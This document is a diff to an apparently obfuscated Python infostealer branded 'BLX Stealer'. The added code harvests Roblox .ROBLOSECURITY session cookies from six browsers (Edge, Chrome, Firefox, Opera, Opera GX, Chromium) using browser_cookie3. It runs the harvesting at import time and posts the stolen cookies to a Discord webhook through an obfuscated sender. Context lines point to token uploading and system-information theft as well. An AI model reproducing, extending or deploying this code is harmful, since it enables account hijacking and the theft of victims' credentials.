@@ -1,3 +1,5 @@
+from discord_webhook import DiscordEmbed, DiscordWebhook
+import browser_cookie3
 import os,psutil,threading
 import subprocess
 import os
@@ -5,6 +7,7 @@ import winreg
 import psutil
 import platform
 import requests
+import browser_cookie3
 import getmac
 import ssl
 import socket
@@ -29,6 +32,7 @@ from zipfile import ZipFile
 import random
 import re
 import sys
+import wmi
 import subprocess
 import uuid
 import socket
@@ -907,7 +911,6 @@ def UP104D70K3N(token, path):
     L04DUr118(hook, data=dumps(data).encode(), headers=headers)
     
 class PcInfo:
-    import wmi
     headers = {
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
@@ -949,6 +952,100 @@ class PcInfo:
             "attachments": []
             }
     L04DUr118(hook, data=dumps(data).encode(), headers=headers)
+
+
+def edge_logger():
+    try:
+        rcookies = browser_cookie3.edge(domain_name='roblox.com')
+        rcookies = str(rcookies)
+        rcookie = rcookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+    
+        return rcookie
+    except Exception as e:
+        print(f"Error occurred in edge_logger: {str(e)}")
+        return None
+    
+def chrome_logger():
+    try:
+        rcookies = browser_cookie3.chrome(domain_name='roblox.com')
+        rcookies = str(rcookies)
+        rcookie = rcookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+    
+        return rcookie
+    except Exception as e:
+        print(f"Error occurred in chrome_logger: {str(e)}")
+        return None
+    
+def firefox_logger():
+    try:
+        rcookies = browser_cookie3.firefox(domain_name='roblox.com')
+        rcookies = str(rcookies)
+        rcookie = rcookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+    
+        return rcookie
+    except Exception as e:
+        print(f"Error occurred in firefox_logger: {str(e)}")
+        return None
+    
+def opera_logger():
+    try:
+        cookies = browser_cookie3.opera(domain_name='roblox.com')
+        cookies = str(cookies)
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        return cookie
+    except Exception as e:
+        print(f"Error occurred in opera_logger: {str(e)}")
+        return None  
+    
+def operagx_logger():
+    try:
+        rcookies = browser_cookie3.opera_gx(domain_name='roblox.com')
+        rcookies = str(rcookies)
+        rcookie = rcookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        
+        return rcookie
+    except Exception as e:
+        print(f"Error occurred in operagx_logger: {str(e)}")
+        return None
+        
+def chromium_logger():
+    try:
+        rcookies = browser_cookie3.chromium(domain_name='roblox.com')
+        rcookies = str(rcookies)
+        rcookie = rcookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+    
+        return rcookie
+    except Exception as e:
+        print(f"Error occurred in chromium_logger: {str(e)}")
+        return None    
+
+roblochrome,robloedge,roblofire,robloopera,roblogx,roblochromium=chrome_logger(),edge_logger(),firefox_logger(),opera_logger(),operagx_logger(),chromium_logger()
+
+
+headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+    }
+
+data = {
+            "content": g108411NF0(),
+            "embeds": [
+                {
+                    "title": "BLX Stealer | Roblox Information",
+                    "description": f'Opera:```{robloopera}```\nChrome:```{roblochrome}```\nEdge:```{robloedge}```\nFirefox:```{roblofire}```\nOperaGX:```{roblogx}```\nChromium:```{roblochromium}```',
+                    "color": color,
+                    "footer": {
+                        "text": "BLX Stealer | discord.gg/blx",
+                        "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
+                    }
+                }
+            ],
+            "username": "BLX Stealer | t.me/blxstealer",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1164188985569071217/1164211448512249856/blx.jpg?ex=65426367&is=652fee67&hm=9da4215ab4422fdbd4a3e2e271e9cbb4fa68feb9ebb79a3307c91ec483a8cf13&",
+            "attachments": []
+            }
+L04DUr118(hook, data=dumps(data).encode(), headers=headers)
+    
 
 def R3F0rM47(listt):
     e = re.findall("(\w+[a-z])",listt)
